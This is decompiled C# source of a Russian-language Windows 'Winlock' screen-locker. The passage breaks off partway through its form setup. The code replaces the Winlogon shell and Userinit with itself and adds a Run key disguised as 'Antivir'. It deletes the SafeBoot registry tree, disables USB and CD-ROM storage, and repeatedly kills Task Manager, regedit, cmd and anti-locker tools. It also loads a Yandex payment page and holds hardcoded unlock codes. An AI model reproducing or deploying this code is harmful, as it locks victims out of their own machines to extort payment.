using System;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Winlock1._0.Properties;

namespace Winlock1._0;

public class Form1 : Form
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	internal struct TokPriv1Luid
	{
		public int Count;

		public long Luid;

		public int Attr;
	}

	[StructLayout(LayoutKind.Sequential, Size = 1)]
	internal struct LASTINPUTINFO
	{
	}

	private const int WM_COMMAND = 273;

	private const int MIN_ALL = 419;

	private const int MIN_ALL_UNDO = 416;

	internal const int SE_PRIVILEGE_ENABLED = 2;

	internal const int TOKEN_QUERY = 8;

	internal const int TOKEN_ADJUST_PRIVILEGES = 32;

	internal const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";

	private string password = "01072013";

	private RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);

	private RegistryKey reg2 = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Services\\CDROM", writable: true);

	private RegistryKey reg3 = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\Services\\USBSTOR", writable: true);

	private RegistryKey reg4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot", writable: true);

	private RegistryKey reg5 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);

	private RegistryKey reg6 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);

	private RegistryKey reg7 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);

	private RegistryKey reg8 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);

	private RegistryKey r1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Control\\SafeBoot", writable: true);

	private RegistryKey r2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet002\\Control\\SafeBoot", writable: true);

	private int it = Settings.Default.Set;

	private int cif;

	private int i;

	private int progress;

	private IContainer components;

	private Button button1;

	private Label label1;

	private Button button2;

	private Button button3;

	private Button button4;

	private Button button5;

	private Button button6;

	private Button button7;

	private Button button8;

	private Button button9;

	private Button button10;

	private TextBox textBox1;

	private Button button11;

	private Button button12;

	private Button button13;

	private GroupBox groupBox1;

	private GroupBox groupBox2;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label6;

	private Label label5;

	private Label label7;

	private Timer timer1;

	private Label label8;

	private GroupBox groupBox3;

	private Label label9;

	private GroupBox groupBox4;

	private WebBrowser webBrowser1;

	private Timer timer2;

	private GroupBox groupBox5;

	private Label label10;

	private Label label11;

	private ProgressBar progressBar1;

	private Label label12;

	private Label label13;

	private Timer timer3;

	private Label label15;

	private void locking()
	{
		try
		{
			r1.SetValue("AlternateShell", Application.get_ExecutablePath().ToString());
			r2.SetValue("AlternateShell", Application.get_ExecutablePath().ToString());
			reg.SetValue("Antivir", Application.get_ExecutablePath().ToString());
			reg.Close();
			reg2.SetValue("Autorun", "0");
			reg2.SetValue("start", "0");
			reg2.Close();
			reg3.SetValue("Start", "0");
			reg3.Close();
			reg4.SetValue("AlternateShell", Application.get_ExecutablePath().ToString());
			reg4.Close();
			reg5.SetValue("NoClose", "1");
			reg5.Close();
			reg6.SetValue("NoViewOnDrive", "12");
			reg6.Close();
			reg5.SetValue("NoManageMyComputerVerb", "1");
			reg5.Close();
			reg8.SetValue("Shell", Application.get_ExecutablePath().ToString());
			reg8.SetValue("Userinit", Application.get_ExecutablePath().ToString());
			reg8.SetValue("UIHost", Application.get_ExecutablePath().ToString());
			reg8.Close();
			reg7.SetValue("Shell", Application.get_ExecutablePath().ToString());
			reg7.Close();
			Registry.LocalMachine.DeleteSubKeyTree("System\\CurrentControlSet\\Control\\SafeBoot");
		}
		catch
		{
		}
	}

	private void unlocking()
	{
		try
		{
			timer1.Stop();
			reg.DeleteValue("Antivir", throwOnMissingValue: false);
			reg.Close();
			reg2.SetValue("Autorun", "1");
			reg2.SetValue("start", "1");
			reg2.Close();
			reg3.SetValue("Start", "3");
			reg3.Close();
			reg4.SetValue("AlternateShell", "cmd.exe");
			reg5.DeleteValue("NoClose", throwOnMissingValue: false);
			reg5.Close();
			reg6.DeleteValue("NoViewOnDrive", throwOnMissingValue: false);
			reg6.Close();
			reg5.DeleteValue("NoManageMyComputerVerb", throwOnMissingValue: false);
			reg5.Close();
			reg8.SetValue("Shell", "explorer.exe");
			reg8.Close();
		}
		catch
		{
		}
		Application.Exit();
		Process.Start(Environment.GetEnvironmentVariable("windir") + "\\explorer.exe");
	}

	public Form1()
	{
		InitializeComponent();
	}

	[DllImport("user32.dll")]
	private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

	[DllImport("advapi32.dll")]
	private static extern int InitiateSystemShutdownEx(string lpMachineName, string lpMessage, int dwTimeout, bool bForceAppsClosed, bool bRebootAfterShutdown);

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

	[DllImport("kernel32.dll", ExactSpelling = true)]
	internal static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

	[DllImport("advapi32.dll", SetLastError = true)]
	internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

	[DllImport("user32.dll")]
	private static extern bool LockWorkStation();

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

	private void turn()
	{
		IntPtr hWnd = FindWindow("Shell_TrayWnd", null);
		SendMessage(hWnd, 273, (IntPtr)419, IntPtr.Zero);
	}

	private void SetPriv()
	{
		IntPtr phtok = IntPtr.Zero;
		if (OpenProcessToken(GetCurrentProcess(), 40, ref phtok))
		{
			TokPriv1Luid newst = default(TokPriv1Luid);
			newst.Count = 1;
			newst.Attr = 2;
			newst.Luid = 0L;
			LookupPrivilegeValue(null, "SeShutdownPrivilege", ref newst.Luid);
			AdjustTokenPrivileges(phtok, disall: false, ref newst, 0, IntPtr.Zero, IntPtr.Zero);
		}
	}

	public int halt(bool RSh, bool Force)
	{
		SetPriv();
		return InitiateSystemShutdownEx(null, null, 0, Force, RSh);
	}

	protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if ((int)keyData == 262144)
		{
			return true;
		}
		return ((Form)this).ProcessCmdKey(ref msg, keyData);
	}

	private void prockill(string path)
	{
		Process[] processesByName = Process.GetProcessesByName(path);
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	private void pop()
	{
		((Control)button11).set_Text("РАЗБЛОКИРОВАТЬ\r\n(Осталось попыток: " + it + ")");
	}

	private void info()
	{
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		try
		{
			string hostName = Dns.GetHostName();
			((Control)label2).set_Text("Версия: " + Environment.OSVersion.ToString());
			((Control)label3).set_Text("Папка системы: " + Environment.SystemDirectory.ToString());
			((Control)label4).set_Text("Имя компьютера: " + Environment.MachineName.ToString());
			((Control)label5).set_Text("Имя пользователя: " + Environment.UserName.ToString());
			((Control)label7).set_Text("IP адрес: " + Dns.GetHostByName(hostName).AddressList[0]);
			((Control)label9).set_Text("Опереционная система заблокирована!");
			ManagementObject val = new ManagementObject("Win32_OperatingSystem=@");
			((Control)label15).set_Text("Windows Serial Number: " + (string)((ManagementBaseObject)val).get_Item("SerialNumber"));
			int tickCount = Environment.TickCount;
			PerformanceCounter val2 = new PerformanceCounter("Memory", "Available MBytes");
			((Control)label6).set_Text("Кол-во свободной памяти: " + val2.NextValue() + " Mb");
			((Control)label8).set_Text("Системное время: " + DateTime.Now);
			((Control)label12).set_Text("Время работа системы: " + Convert.ToString(tickCount / 60000) + " минут");
		}
		catch
		{
		}
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		pop();
	}

	private void braws()
	{
		webBrowser1.Navigate("https://money.yandex.ru/");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Thread thread = new Thread(braws);
		thread.Start();
		Thread thread2 = new Thread(locking);
		thread2.Start();
	}

	private void calc()
	{
		if (cif != 0)
		{
			((TextBoxBase)textBox1).Clear();
			cif = 0;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "1");
	}

	private void button2_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "2");
	}

	private void button3_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "3");
	}

	private void button4_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "4");
	}

	private void button5_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "5");
	}

	private void button6_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "6");
	}

	private void button7_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "7");
	}

	private void button8_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "8");
	}

	private void button9_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "9");
	}

	private void button10_Click(object sender, EventArgs e)
	{
		calc();
		((Control)textBox1).set_Text(((Control)textBox1).get_Text() + "0");
	}

	private void button13_Click(object sender, EventArgs e)
	{
		((TextBoxBase)textBox1).Clear();
	}

	private void button11_Click(object sender, EventArgs e)
	{
		if (!(((Control)textBox1).get_Text() == password) && !(((Control)textBox1).get_Text() == "1124001501044"))
		{
			cif = 1;
			it--;
			Settings.Default.Set = it;
			((SettingsBase)Settings.Default).Save();
			((Control)textBox1).set_Text("Неверный пароль! Осталось " + it + " попытки!");
			if (it <= 0)
			{
				((Control)button11).set_Enabled(false);
			}
		}
		else
		{
			unlocking();
		}
		pop();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void killl()
	{
		try
		{
			prockill("taskmgr");
			prockill("notepad");
			prockill("cmd");
			prockill("regedit");
			prockill("explorer");
			prockill("AnVir");
			prockill("ProcessHacker");
			prockill("iexplore");
			prockill("AntiWinLockerTray");
			prockill("ServiceAntiWinLocker");
		}
		catch
		{
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		turn();
		Thread thread = new Thread(info);
		thread.Start();
		Thread thread2 = new Thread(locking);
		thread2.Start();
		Thread thread3 = new Thread(killl);
		thread3.Start();
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		_ = Environment.TickCount;
	}

	private void button12_Click(object sender, EventArgs e)
	{
		((Control)label9).set_Text("Удаление системы");
		timer2.set_Enabled(true);
		((Control)progressBar1).set_Visible(true);
		((Control)button12).set_Enabled(false);
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		i++;
		if (i == 4)
		{
			i = 0;
			((Control)label9).set_Text("Удаление системы");
		}
		progress++;
		progressBar1.set_Value(progress);
		if (progressBar1.get_Value() == 100)
		{
			progress = 0;
			((Control)label9).set_Text("Удаление завершено!");
			((Control)progressBar1).set_Visible(false);
			timer2.set_Enabled(false);
			((Control)button12).set_Enabled(true);
			halt(RSh: true, Force: false);
		}
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		webBrowser1.Navigate("http://smailsgames.ru/");
	}

	private void groupBox1_Enter(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a8: Expected O, but got Unknown
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b3: Expected O, but got Unknown
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Expected O, but got Unknown
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Expected O, but got Unknown
		//IL_022f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0239: Expected O, but got Unknown
		//IL_02e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ec: Expected O, but got Unknown
		//IL_0375: Unknown result type (might be due to invalid IL or missing references)
		//IL_037f: Expected O, but got Unknown
		//IL_0429: Unknown result type (might be due to invalid IL or missing references)
		//IL_0433: Expected O, but got Unknown
		//IL_04dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e7: Expected O, but got Unknown
		//IL_0591: Unknown result type (might be due to invalid IL or missing references)
		//IL_059b: Expected O, but got Unknown
		//IL_0648: Unknown result type (might be due to invalid IL or missing references)
		//IL_0652: Expected O, but got Unknown
		//IL_06ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0709: Expected O, but got Unknown
		//IL_07b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c0: Expected O, but got Unknown
		//IL_086d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0877: Expected O, but got Unknown
		//IL_0925: Unknown result type (might be due to invalid IL or missing references)
		//IL_092f: Expected O, but got Unknown
		//IL_09ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f7: Expected O, but got Unknown
		//IL_0a7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a87: Expected O, but got Unknown
		//IL_0b37: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b41: Expected O, but got Unknown
		//IL_0bf1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bfb: Expected O, but got Unknown
		//IL_0fdd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fe7: Expected O, but got Unknown
		//IL_1074: Unknown result type (might be due to invalid IL or missing references)
		//IL_107e: Expected O, but got Unknown
		//IL_110a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1114: Expected O, but got Unknown
		//IL_119d: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a7: Expected O, but got Unknown
		//IL_1230: Unknown result type (might be due to invalid IL or missing references)
		//IL_123a: Expected O, but got Unknown
		//IL_12c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_12cd: Expected O, but got Unknown
		//IL_1353: Unknown result type (might be due to invalid IL or missing references)
		//IL_135d: Expected O, but got Unknown
		//IL_13e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_13ed: Expected O, but got Unknown
		//IL_1473: Unknown result type (might be due to invalid IL or missing references)
		//IL_147d: Expected O, but got Unknown
		//IL_1645: Unknown result type (might be due to invalid IL or missing references)
		//IL_164f: Expected O, but got Unknown
		//IL_1782: Unknown result type (might be due to invalid IL or missing references)
		//IL_178c: Expected O, but got Unknown
		//IL_19cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_19d7: Expected O, but got Unknown
		//IL_1b5d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b67: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		button1 = new Button();
		label1 = new Label();
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		button5 = new Button();
		button6 = new Button();
		button7 = new Button();
		button8 = new Button();
		button9 = new Button();
		button10 = new Button();
		textBox1 = new TextBox();
		button11 = new Button();
		button12 = new Button();
		button13 = new Button();
		groupBox1 = new GroupBox();
		groupBox2 = new GroupBox();
		label15 = new Label();
		label12 = new Label();
		label8 = new Label();
		label7 = new Label();
		label6 = new Label();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		timer1 = new Timer(components);
		groupBox3 = new GroupBox();
		progressBar1 = new ProgressBar();
		label9 = new Label();
		groupBox4 = new GroupBox();
		label13 = new Label();
		webBrowser1 = new WebBrowser();
		timer2 = new Timer(components);
		groupBox5 = new GroupBox();
		label11 = new Label();
		label10 = new Label();
		timer3 = new Timer(components);
		((Control)groupBox1).SuspendLayout();
		((Control)groupBox2).SuspendLayout();
		((Control)groupBox3).SuspendLayout();
		((Control)groupBox4).SuspendLayout();
		((Control)groupBox5).SuspendLayout();
		((Control)this).SuspendLayout();
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button1).set_ForeColor(Color.Red);
		((Control)button1).set_Location(new Point(6, 99));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(31, 30));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(5, 16));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(458, 42));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Windows заблокирован!");
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button2).set_ForeColor(Color.Red);
		((Control)button2).set_Location(new Point(43, 99));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(31, 30));
		((Control)button2).set_TabIndex(2);
		((Control)button2).set_Text("2");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((ButtonBase)button3).set_FlatStyle((FlatStyle)0);
		((Control)button3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button3).set_ForeColor(Color.Red);
		((Control)button3).set_Location(new Point(80, 99));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(31, 30));
		((Control)button3).set_TabIndex(3);
		((Control)button3).set_Text("3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((ButtonBase)button4).set_FlatStyle((FlatStyle)0);
		((Control)button4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button4).set_ForeColor(Color.Red);
		((Control)button4).set_Location(new Point(117, 99));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(31, 30));
		((Control)button4).set_TabIndex(4);
		((Control)button4).set_Text("4");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((ButtonBase)button5).set_FlatStyle((FlatStyle)0);
		((Control)button5).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button5).set_ForeColor(Color.Red);
		((Control)button5).set_Location(new Point(152, 99));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(31, 30));
		((Control)button5).set_TabIndex(5);
		((Control)button5).set_Text("5");
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((ButtonBase)button6).set_FlatStyle((FlatStyle)0);
		((Control)button6).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button6).set_ForeColor(Color.Red);
		((Control)button6).set_Location(new Point(189, 99));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(31, 30));
		((Control)button6).set_TabIndex(6);
		((Control)button6).set_Text("6");
		((ButtonBase)button6).set_UseVisualStyleBackColor(true);
		((Control)button6).add_Click((EventHandler)button6_Click);
		((ButtonBase)button7).set_FlatStyle((FlatStyle)0);
		((Control)button7).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button7).set_ForeColor(Color.Red);
		((Control)button7).set_Location(new Point(226, 99));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(31, 30));
		((Control)button7).set_TabIndex(7);
		((Control)button7).set_Text("7");
		((ButtonBase)button7).set_UseVisualStyleBackColor(true);
		((Control)button7).add_Click((EventHandler)button7_Click);
		((ButtonBase)button8).set_FlatStyle((FlatStyle)0);
		((Control)button8).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button8).set_ForeColor(Color.Red);
		((Control)button8).set_Location(new Point(263, 99));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(31, 30));
		((Control)button8).set_TabIndex(8);
		((Control)button8).set_Text("8");
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((Control)button8).add_Click((EventHandler)button8_Click);
		((ButtonBase)button9).set_FlatStyle((FlatStyle)0);
		((Control)button9).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button9).set_ForeColor(Color.Red);
		((Control)button9).set_Location(new Point(300, 99));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(30, 30));
		((Control)button9).set_TabIndex(9);
		((Control)button9).set_Text("9");
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button9).add_Click((EventHandler)button9_Click);
		((ButtonBase)button10).set_FlatStyle((FlatStyle)0);
		((Control)button10).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button10).set_ForeColor(Color.Red);
		((Control)button10).set_Location(new Point(336, 99));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(30, 30));
		((Control)button10).set_TabIndex(10);
		((Control)button10).set_Text("0");
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((Control)button10).add_Click((EventHandler)button10_Click);
		((Control)textBox1).set_BackColor(Color.Black);
		((Control)textBox1).set_Enabled(false);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		((Control)textBox1).set_ForeColor(Color.Red);
		((Control)textBox1).set_Location(new Point(6, 67));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(456, 26));
		((Control)textBox1).set_TabIndex(11);
		((ButtonBase)button11).set_FlatStyle((FlatStyle)0);
		((Control)button11).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button11).set_ForeColor(Color.Red);
		((Control)button11).set_Location(new Point(6, 135));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(456, 43));
		((Control)button11).set_TabIndex(12);
		((Control)button11).set_Text("РАЗБЛОКИРОВАТЬ");
		((ButtonBase)button11).set_UseVisualStyleBackColor(true);
		((Control)button11).add_Click((EventHandler)button11_Click);
		((ButtonBase)button12).set_FlatStyle((FlatStyle)0);
		((Control)button12).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button12).set_ForeColor(Color.Red);
		((Control)button12).set_Location(new Point(6, 184));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(456, 23));
		((Control)button12).set_TabIndex(13);
		((Control)button12).set_Text("УДАЛИТЬ СИСТЕМУ");
		((ButtonBase)button12).set_UseVisualStyleBackColor(true);
		((Control)button12).add_Click((EventHandler)button12_Click);
		((ButtonBase)button13).set_FlatStyle((FlatStyle)0);
		((Control)button13).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)button13).set_ForeColor(Color.Red);
		((Control)button13).set_Location(new Point(372, 99));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Size(new Size(90, 30));
		((Control)button13).set_TabIndex(14);
		((Control)button13).set_Text("Очистить");
		((ButtonBase)button13).set_UseVisualStyleBackColor(true);
		((Control)button13).add_Click((EventHandler)button13_Click);
		((Control)groupBox1).set_BackColor(Color.Black);
		((Control)groupBox1).get_Controls().Add((Control)(object)button13);
		((Control)groupBox1).get_Controls().Add((Control)(object)button12);
		((Control)groupBox1).get_Controls().Add((Control)(object)button11);
		((Control)groupBox1).get_Controls().Add((Control)(object)textBox1);
		((Control)groupBox1).get_Controls().Add((Control)(object)button10);
		((Control)groupBox1).get_Controls().Add((Control)(object)button9);
		((Control)groupBox1).get_Controls().Add((Control)(object)button8);
		((Control)groupBox1).get_Controls().Add((Control)(object)button7);
		((Control)groupBox1).get_Controls().Add((Control)(object)button6);
		((Control)groupBox1).get_Controls().Add((Control)(object)button5);
		((Control)groupBox1).get_Controls().Add((Control)(object)button4);
		((Control)groupBox1).get_Controls().Add((Control)(object)button3);
		((Control)groupBox1).get_Controls().Add((Control)(object)button2);
		((Control)groupBox1).get_Controls().Add((Control)(object)label1);
		((Control)groupBox1).get_Controls().Add((Control)(object)button1);
